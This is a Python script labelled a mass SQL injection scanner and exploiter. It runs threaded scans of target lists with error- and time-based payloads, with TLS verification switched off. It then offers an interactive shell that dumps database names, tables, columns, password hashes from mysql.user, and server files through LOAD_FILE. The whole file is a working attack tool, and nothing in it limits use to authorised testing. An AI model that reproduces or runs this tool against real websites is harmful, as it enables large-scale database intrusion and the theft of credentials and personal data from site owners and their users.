#!/usr/bin/env python3
"""
███████╗  ██████╗  ██╗         ███╗   ███╗  █████╗  ███████╗ ███████╗
██╔════╝ ██╔═══██╗ ██║         ████╗ ████║ ██╔══██╗ ██╔════╝ ██╔════╝
███████╗ ██║   ██║ ██║         ██╔████╔██║ ███████║ ███████╗ ███████╗
╚════██║ ██║▄▄ ██║ ██║         ██║╚██╔╝██║ ██╔══██║ ╚════██║ ╚════██║
███████║ ╚██████╔╝ ███████╗    ██║ ╚═╝ ██║ ██║  ██║ ███████║ ███████║
╚══════╝  ╚══▀▀═╝  ╚══════╝    ╚═╝     ╚═╝ ╚═╝  ╚═╝ ╚══════╝ ╚══════╝
                         Mass SQL Injection Scanner & Exploiter
"""

import os, sys, re, ssl, time, json, urllib.parse, urllib.request, urllib.error
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
TIMEOUT = 20

# ─── SQLi Payloads ──────────────────────────────────────────────────
PAYLOADS = {
    "error_based": [
        {"name": "Single Quote", "payload": "'", "detect": ["sql", "syntax", "mysql", "error", "unclosed", "odbc", "warning"]},
        {"name": "Double Quote", "payload": '"', "detect": ["sql", "syntax", "error"]},
        {"name": "Backtick", "payload": "`", "detect": ["sql", "error"]},
        {"name": "Parenthesis", "payload": "')", "detect": ["sql", "syntax", "error"]},
        {"name": "Double Parenthesis", "payload": '"))', "detect": ["sql", "syntax", "error"]},
        {"name": "OR 1=1", "payload": "' OR '1'='1", "detect": ["sql", "error"]},
        {"name": "AND 1=1", "payload": "' AND '1'='1", "detect": ["sql", "error"]},
        {"name": "OR 1=1 --", "payload": "' OR 1=1--", "detect": ["sql", "error"]},
        {"name": "UNION SELECT", "payload": "' UNION SELECT NULL--", "detect": ["sql", "error"]},
        {"name": "ORDER BY", "payload": "' ORDER BY 1--", "detect": ["sql", "error"]},
        {"name": "extractvalue", "payload": "' AND extractvalue(1,concat(0x7e,version()))--", "detect": ["~"]},
        {"name": "updatexml", "payload": "' AND updatexml(1,concat(0x7e,version()),1)--", "detect": ["~"]},
    ],
    "boolean_based": [
        {"name": "AND 1=1", "payload": "' AND '1'='1", "true_detect": None},
        {"name": "AND 1=2", "payload": "' AND '1'='2", "false_detect": None},
        {"name": "OR 1=1", "payload": "' OR '1'='1", "true_detect": None},
        {"name": "AND SLEEP(0)", "payload": "' AND SLEEP(0)--", "true_detect": None},
    ],
    "time_based": [
        {"name": "MySQL SLEEP(5)", "payload": "' AND SLEEP(5)--", "delay": 5, "db": "mysql"},
        {"name": "MySQL SLEEP(10)", "payload": "' AND SLEEP(10)--", "delay": 10, "db": "mysql"},
        {"name": "MySQL BENCHMARK", "payload": "' AND BENCHMARK(5000000,MD5(1))--", "delay": 3, "db": "mysql"},
        {"name": "PostgreSQL pg_sleep", "payload": "';SELECT pg_sleep(5)--", "delay": 5, "db": "postgresql"},
        {"name": "MSSQL WAITFOR", "payload": "';WAITFOR DELAY '00:00:05'--", "delay": 5, "db": "mssql"},
        {"name": "Oracle DBMS_PIPE", "payload": "'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),5)||'", "delay": 5, "db": "oracle"},
    ],
    "union_based": [
        {"name": "UNION NULL", "payload": "' UNION SELECT NULL--", "detect": None},
        {"name": "UNION NULL,NULL", "payload": "' UNION SELECT NULL,NULL--", "detect": None},
        {"name": "UNION NULL,NULL,NULL", "payload": "' UNION SELECT NULL,NULL,NULL--", "detect": None},
        {"name": "UNION NULL...x5", "payload": "' UNION SELECT NULL,NULL,NULL,NULL,NULL--", "detect": None},
        {"name": "UNION NULL...x10", "payload": "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--", "detect": None},
        {"name": "UNION ALL NULL", "payload": "' UNION ALL SELECT NULL--", "detect": None},
    ],
}

# ─── Database extraction queries ──────────────────────────────────
EXTRACT_QUERIES = {
    "mysql": {
        "version": "' UNION SELECT @@version,NULL,NULL--",
        "database": "' UNION SELECT database(),NULL,NULL--",
        "user": "' UNION SELECT user(),NULL,NULL--",
        "hostname": "' UNION SELECT @@hostname,NULL,NULL--",
        "tables": "' UNION SELECT GROUP_CONCAT(table_name),NULL,NULL FROM information_schema.tables WHERE table_schema=database()--",
        "columns": "' UNION SELECT GROUP_CONCAT(column_name),NULL,NULL FROM information_schema.columns WHERE table_name='{table}' AND table_schema=database()--",
        "dump": "' UNION SELECT GROUP_CONCAT({column},0x3a,{column2}),NULL,NULL FROM {table}--",
        "users": "' UNION SELECT GROUP_CONCAT(user,0x3a,authentication_string),NULL,NULL FROM mysql.user--",
        "files": "' UNION SELECT LOAD_FILE('{file}'),NULL,NULL--",
        "write": "' UNION SELECT NULL,NULL,NULL INTO OUTFILE '{path}'--",
    },
    "postgresql": {
        "version": "';SELECT version()--",
        "database": "';SELECT current_database()--",
        "user": "';SELECT current_user--",
        "tables": "';SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public'--",
        "columns": "';SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_name='{table}'--",
        "dump": "';SELECT string_agg({column}::text,',') FROM {table}--",
        "users": "';SELECT string_agg(usename,',') FROM pg_user--",
    },
    "mssql": {
        "version": "';SELECT @@version--",
        "database": "';SELECT DB_NAME()--",
        "user": "';SELECT SYSTEM_USER--",
        "tables": "';SELECT STRING_AGG(table_name,',') FROM information_schema.tables--",
        "columns": "';SELECT STRING_AGG(column_name,',') FROM information_schema.columns WHERE table_name='{table}'--",
        "dump": "';SELECT STRING_AGG({column},',') FROM {table}--",
        "users": "';SELECT STRING_AGG(name,',') FROM sys.sql_logins--",
    },
    "oracle": {
        "version": "'||(SELECT banner FROM v$version WHERE ROWNUM=1)||'",
        "database": "'||(SELECT SYS.DATABASE_NAME FROM DUAL)||'",
        "user": "'||(SELECT USER FROM DUAL)||'",
        "tables": "'||(SELECT LISTAGG(table_name,',') FROM all_tables WHERE ROWNUM<50)||'",
    },
}

# ─── HTTP ───────────────────────────────────────────────────────────
def fetch(url, data=None, headers=None, method="GET", timeout=TIMEOUT):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    if headers is None:
        headers = {}
    headers.setdefault("User-Agent", UA)

    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        start = time.time()
        resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        elapsed = time.time() - start
        body = resp.read().decode("utf-8", errors="replace")
        return resp.status, dict(resp.headers), body, elapsed
    except urllib.error.HTTPError as e:
        elapsed = time.time() - start
        body = e.read().decode("utf-8", errors="replace") if e.fp else ""
        return e.code, dict(e.headers), body, elapsed
    except Exception as e:
        return 0, {}, str(e), 0

def inject_payload(url, payload, method="GET"):
    """Inject a payload into a URL."""
    if method == "GET":
        if "?" in url:
            if "=" in url:
                # Replace existing parameter value
                base = url.split("=")[0]
                return f"{base}={urllib.parse.quote(payload)}"
            else:
                return f"{url}{urllib.parse.quote(payload)}"
        else:
            return f"{url}?id={urllib.parse.quote(payload)}"
    return url

# ─── Scanner ────────────────────────────────────────────────────────
def test_sqli(url):
    """Test a URL for SQL injection vulnerability."""
    result = {
        "url": url,
        "vulnerable": False,
        "method": None,
        "payload": None,
        "db_type": None,
        "evidence": None,
        "injection_point": None,
    }

    # Step 1: Error-based detection
    for p in PAYLOADS["error_based"]:
        test_url = inject_payload(url, p["payload"])
        s, h, b, elapsed = fetch(test_url)

        if any(detect in b.lower() for detect in p["detect"]):
            result["vulnerable"] = True
            result["method"] = "error_based"
            result["payload"] = p["payload"]
            result["evidence"] = b[:500]
            result["injection_point"] = "url_param"

            # Detect DB type
            if "mysql" in b.lower():
                result["db_type"] = "mysql"
            elif "postgresql" in b.lower() or "pg_" in b.lower():
                result["db_type"] = "postgresql"
            elif "microsoft" in b.lower() or "mssql" in b.lower() or "odbc" in b.lower():
                result["db_type"] = "mssql"
            elif "oracle" in b.lower() or "ora-" in b.lower():
                result["db_type"] = "oracle"

            return result

    # Step 2: Time-based detection
    # First get baseline
    baseline = 0
    for _ in range(2):
        s, h, b, elapsed = fetch(url)
        baseline += elapsed
    baseline /= 2

    for p in PAYLOADS["time_based"]:
        test_url = inject_payload(url, p["payload"])
        s, h, b, elapsed = fetch(test_url, timeout=min(TIMEOUT, p["delay"] + 10))

        if elapsed > p["delay"] * 0.7:
            result["vulnerable"] = True
            result["method"] = "time_based"
            result["payload"] = p["payload"]
            result["db_type"] = p["db"]
            result["evidence"] = f"Response delay: {elapsed:.1f}s (expected: {p['delay']}s)"
            result["injection_point"] = "url_param"
            return result

    return result

def extract_data(url, db_type, query_type, **kwargs):
    """Extract data from a vulnerable SQL injection point."""
    if db_type not in EXTRACT_QUERIES:
        return None

    queries = EXTRACT_QUERIES[db_type]
    if query_type not in queries:
        return None

    query = queries[query_type]
    for key, value in kwargs.items():
        query = query.replace(f"{{{key}}}", value)

    test_url = inject_payload(url, query)
    s, h, b, elapsed = fetch(test_url, timeout=30)

    if s == 200 and len(b) > 10:
        return b[:5000]
    return None

# ─── Interactive SQLi Shell ─────────────────────────────────────────
def sqli_shell(url, db_type, inj_point):
    """Interactive SQL injection shell."""
    print(f"\n  SQL Injection Shell")
    print(f"  Target: {url}")
    print(f"  DB: {db_type}")
    print(f"  Injection: {inj_point}")
    print()
    print("  Commands:")
    print("    version     - Get DB version")
    print("    database    - Get current database")
    print("    user        - Get current user")
    print("    tables      - List tables")
    print("    columns <t> - List columns of table <t>")
    print("    dump <t> <c> - Dump data from table.column")
    print("    query <sql> - Execute custom SQL query")
    print("    exit        - Exit shell")
    print()

    while True:
        try:
            cmd = input("  sqli> ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n  Exiting...")
            break

        if not cmd:
            continue
        if cmd == "exit":
            break

        parts = cmd.split()
        action = parts[0].lower()

        if action == "version":
            data = extract_data(url, db_type, "version")
            print(f"  {data[:500] if data else 'Failed'}")

        elif action == "database":
            data = extract_data(url, db_type, "database")
            print(f"  {data[:500] if data else 'Failed'}")

        elif action == "user":
            data = extract_data(url, db_type, "user")
            print(f"  {data[:500] if data else 'Failed'}")

        elif action == "tables":
            data = extract_data(url, db_type, "tables")
            print(f"  {data[:1000] if data else 'Failed'}")

        elif action == "columns" and len(parts) > 1:
            table = parts[1]
            data = extract_data(url, db_type, "columns", table=table)
            print(f"  {data[:1000] if data else 'Failed'}")

        elif action == "dump" and len(parts) > 2:
            table = parts[1]
            column = parts[2]
            column2 = column
            data = extract_data(url, db_type, "dump", table=table, column=column, column2=column2)
            print(f"  {data[:2000] if data else 'Failed'}")

        elif action == "query" and len(parts) > 1:
            query = " ".join(parts[1:])
            test_url = inject_payload(url, query)
            s, h, b, elapsed = fetch(test_url, timeout=30)
            print(f"  {b[:2000] if b else '(empty)'}")

        elif action == "users":
            if db_type in ["mysql", "mssql", "postgresql"]:
                data = extract_data(url, db_type, "users")
                print(f"  {data[:1000] if data else 'Failed'}")
            else:
                print("  Not supported for this DB type")

        elif action == "files" and db_type == "mysql" and len(parts) > 1:
            filepath = parts[1]
            data = extract_data(url, db_type, "files", file=filepath)
            print(f"  {data[:2000] if data else 'Failed'}")

        else:
            print(f"  Unknown command: {action}")

# ─── Main ───────────────────────────────────────────────────────────
def main():
    print("""
    S Q L I    M A S S    S C A N N E R
    """)

    print("  [1] Single URL scan")
    print("  [2] Mass scan (file)")
    print("  [3] Interactive SQLi shell (on known vulnerable URL)")
    print("  [0] Exit")
    print()

    choice = input("  Select: ").strip()

    if choice == "0":
        return

    if choice == "3":
        url = input("  Vulnerable URL: ").strip()
        db = input("  DB type (mysql/postgresql/mssql/oracle): ").strip().lower()
        sqli_shell(url, db, "url_param")
        return

    if choice == "1":
        targets = [input("  Target URL: ").strip()]
    elif choice == "2":
        filepath = input("  Targets file: ").strip()
        if not os.path.exists(filepath):
            print(f"  File not found: {filepath}")
            return
        with open(filepath) as f:
            targets = [l.strip() for l in f if l.strip() and not l.startswith("#")]
    else:
        return

    threads = input("  Threads (default 20): ").strip()
    threads = int(threads) if threads.isdigit() else 20

    print(f"\n  Scanning {len(targets)} target(s)...")
    print("  " + "═" * 50)

    results = []
    with ThreadPoolExecutor(max_workers=threads) as ex:
        futures = {ex.submit(test_sqli, t): t for t in targets}
        for i, future in enumerate(as_completed(futures), 1):
            target = futures[future]
            try:
                result = future.result()
                results.append(result)
                if result["vulnerable"]:
                    print(f"  [{i}/{len(targets)}] VULN: {result['url']}")
                    print(f"       Method: {result['method']} | DB: {result['db_type'] or 'unknown'}")
                    print(f"       Payload: {result['payload']}")
                else:
                    print(f"  [{i}/{len(targets)}] OK: {target}", end="\r")
            except Exception as e:
                print(f"  [{i}/{len(targets)}] ERR: {target} — {e}")

    vulns = [r for r in results if r["vulnerable"]]
    print(f"\n\n  " + "═" * 50)
    print(f"  Vulnerable: {len(vulns)}/{len(targets)}")

    if vulns:
        output_file = f"sqli_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(output_file, "w") as f:
            json.dump(vulns, f, indent=2)
        print(f"  Saved: {output_file}")

        # Offer interactive shell
        print(f"\n  Enter URL index for interactive shell (0 to skip):")
        for i, v in enumerate(vulns[:10]):
            print(f"    [{i+1}] {v['url']} ({v['db_type'] or 'unknown'})")

        try:
            idx = int(input("  Index: ").strip())
            if 1 <= idx <= len(vulns):
                v = vulns[idx - 1]
                sqli_shell(v["url"], v["db_type"] or "mysql", v["injection_point"])
        except (ValueError, EOFError):
            pass

    print()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n  Interrupted. Exiting...\n")
        sys.exit(0)